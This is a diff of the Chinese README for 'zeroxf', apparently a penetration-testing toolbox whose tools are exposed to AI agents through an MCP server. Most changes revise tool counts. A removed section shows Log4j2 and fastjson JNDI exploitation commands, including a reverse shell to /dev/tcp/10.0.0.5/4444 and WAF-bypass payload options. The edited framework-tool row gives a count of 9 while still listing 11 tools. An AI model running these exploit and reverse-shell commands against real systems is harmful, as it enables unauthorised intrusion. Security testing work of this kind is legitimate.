@@ -1,9 +1,9 @@
 # zeroxf 工具箱 · AI 版
 
-**一个既给人用、也给 AI 用的渗透测试工具箱**——65 个工具，统一的图形界面、命令行与 MCP 接口，三套入口共用同一份工具注册表。
+**一个既给人用、也给 AI 用的渗透测试工具箱**——63 个工具，统一的图形界面、命令行与 MCP 接口，三套入口共用同一份工具注册表。
 
 [![Platform](https://img.shields.io/badge/platform-Windows%20%7C%20WSL%2FLinux-blue)](#安装)
-[![Tools](https://img.shields.io/badge/tools-65%20(%E5%85%B6%E4%B8%AD59%E4%B8%AAAI%E5%8F%AF%E8%B0%83)-brightgreen)](#集成的工具)
+[![Tools](https://img.shields.io/badge/tools-63%20(%E5%85%B6%E4%B8%AD57%E4%B8%AAAI%E5%8F%AF%E8%B0%83)-brightgreen)](#集成的工具)
 [![License](https://img.shields.io/badge/license-GPL--3.0-orange)](LICENSE)
 [![MCP](https://img.shields.io/badge/MCP-ready-purple)](#mcp-ai-调用)
 
@@ -37,7 +37,7 @@
 
 ## 亮点
 
-- **65 个工具开箱可用**，横跨信息收集到后渗透的完整链路；其中 **59 个可被 AI 直接调用**
+- **63 个工具开箱可用**，横跨信息收集到后渗透的完整链路；其中 **57 个可被 AI 直接调用**
 - **三套入口，一份配置** —— GUI 里能点的，CLI 和 MCP 里都能调，不会出现"界面有、命令行没有"的割裂
 - **依赖自动装配** —— `provision_tools.py` 一条命令拉齐全部工具二进制、便携 JDK、GUI 运行时，自动适配 Windows / Linux / macOS
 - **零环境依赖的 JDK 方案** —— 内置便携 JDK 8/11/17（8 与 11 为 Liberica full 版，内含 JavaFX），12 个 jar 类工具无需系统装 Java
@@ -50,13 +50,13 @@
 
 ## 集成的工具
 
-**共 65 个**（59 个 AI 可直接调用），按 9 大类组织：
+**共 63 个**（57 个 AI 可直接调用），按 9 大类组织：
 
 | 分类 | 数量 | 代表工具 |
 | --- | ---: | --- |
 | 信息收集 | 12 | `nmap` `httpx` `nuclei` `ffuf` `subfinder` `naabu` `katana` `dnsx` `uncover` `gobuster` `urlfinder` `dirsearch` |
 | 漏洞扫描与利用 | 8 | `nuclei` `sqlmap` `xray` `dalfox` `zap` `exploitdb` `ssti` `docem` |
-| 框架漏洞利用 | 11 | `shiro` `struts2` `weblogic` `fastjson`→`jndi` `log4j`→`jndi` `thinkphp` `spring` `tomcat` `dedecmscan` `redis` `nacos` |
+| 框架漏洞利用 | 9 | `shiro` `struts2` `weblogic` `fastjson`→`jndi` `log4j`→`jndi` `thinkphp` `spring` `tomcat` `dedecmscan` `redis` `nacos` |
 | 重点系统漏洞 | 8 | `heapdump` `ruoyi` `nacos` `jenkins` `xxl-job` `jeecg` `iwannagetall` `hyacinth` |
 | 内网渗透 | 4 | `fscan` `yasso` `netexec` `impacket` |
 | 爆破 | 2 | `hydra` `hashcat` |
@@ -80,40 +80,10 @@
 
 `geshell doctor` 会明确列出这些项，不会静默失败。
 
-> `fastjson` 与 `log4j` 曾长期在表里——它们指向的第三方 jar 无公开源，一直是两条
-> 空壳。现在改由自研的 `javadeser` CLI 覆盖（见下），**不再是缺失项**。
-
-### Java 反序列化：fastjson 与 log4j2
-
-这两类漏洞的利用工具没有公开源，但**协议本身完全可以自己实现**。`javadeser`
-补的就是从「起 JNDI 服务」到「把载荷送进目标并确认命中」这整段：
-
-```bash
-# 一条命令跑通：起 JNDI 服务 + 打目标 + 报告是否命中
-geshell log4j -u http://target/ --serve --lhost 10.0.0.5 \
-        --cmd 'bash -i >& /dev/tcp/10.0.0.5/4444 0>&1'
-
-geshell fastjson -u http://target/api --serve --lhost 10.0.0.5 --cmd '...'
-
-geshell log4j --all-templates -u http://target/     # 把所有 WAF 绕过变体打一遍
-geshell fastjson --gadget jdbc-rowset --evasion unicode -u http://target/api
-geshell log4j --jndi ldap://10.0.0.5:1389/ab12 --show   # 只看会发出什么
-```
-
-| | fastjson | log4j2 |
-| --- | --- | --- |
-| 载荷 | 6 条 `@type` gadget 链 | 8 种模板（含 `${lower:j}ndi` 等绕过写法） |
-| 注入点 | JSON body | 16 个常见 Header + 自定义参数/路径 |
-| 绕过 | 5 种 `@type` 变体 | `--all-templates` 全打 |
-
-**怎么判定打没打中**：不看目标响应（它可能报错），而是看 **JNDI 服务端有没有收到
-目标的查找请求**。收到就说明载荷成功进了目标 JNDI 流程——这是注入成立的硬证据。
-至于能否进一步 RCE，取决于目标的 JDK 版本与 classpath（8u191+ 的
-`trustURLCodebase=false` 需要目标是 Tomcat/SpringBoot 环境才有对应链），工具会
-在命中提示里说清这一点，不夸大。
-
-> 验证方式：本地起了**真实的漏洞靶机**——真 log4j-core 2.14.1、真 fastjson 1.2.24
-> （依赖从 Maven Central 拉），5 项断言全过，含命中判定、未命中诊断、绕过模板生效。
+> `fastjson` / `log4j` 两条已从注册表移除。它们指向的第三方 jar 从无公开来源，
+> 长期是两条空壳；而它们对应的**利用场景**（JNDI 注入）由 `jndi` 覆盖——
+> 那条是实打实的工具（JNDI-Injection-Exploit），起 LDAP/RMI 服务并投递 payload。
+> 与其留两个装不上的条目，不如只留能用的那个。
 
 ### WebShell 管理：三种 GUI 工具的协议，收进一个 CLI
 
@@ -277,10 +247,10 @@ python3 scripts/setup_burp.py
 
 | 平台 | 就绪 | 缺失 |
 | --- | --- | --- |
-| **WSL / Linux** | **59/59** | —— |
-| **Windows** | **59/59** | —— |
+| **WSL / Linux** | **57/57** | —— |
+| **Windows** | **57/57** | —— |
 
-**两端完全一致**（都是 59/59）。`geshell doctor` 只会列出 3 条——`CobaltStrike`、
+**两端完全一致**（都是 57/57）。`geshell doctor` 只会列出 3 条——`CobaltStrike`、
 `BurpSuite`、`蚁剑`，都是商业软件或需自备，不会静默失败。
 
 > 上表的就绪判据是**入口文件是否存在**。Windows 侧另有一个它测不出来的坑：
@@ -294,7 +264,7 @@ python3 scripts/setup_burp.py
 
 ## 安装
 
-### 先搞清楚：65 个工具分别从哪来
+### 先搞清楚：63 个工具分别从哪来
 
 工具箱的获取方式**不是一种而是四种**，因为它们性质不同：
 
@@ -415,7 +385,7 @@ python3 scripts/verify_all.py --offline  # 不联网
 
 ### MCP（AI 调用）
 
-`ai/mcp_server.py` 是一个 stdio JSON-RPC MCP server，把 59 个可调用工具暴露为 `tool_<名称>`：
+`ai/mcp_server.py` 是一个 stdio JSON-RPC MCP server，把 57 个可调用工具暴露为 `tool_<名称>`：
 
 在 `~/.claude.json` 的 `mcpServers` 段加入：
 
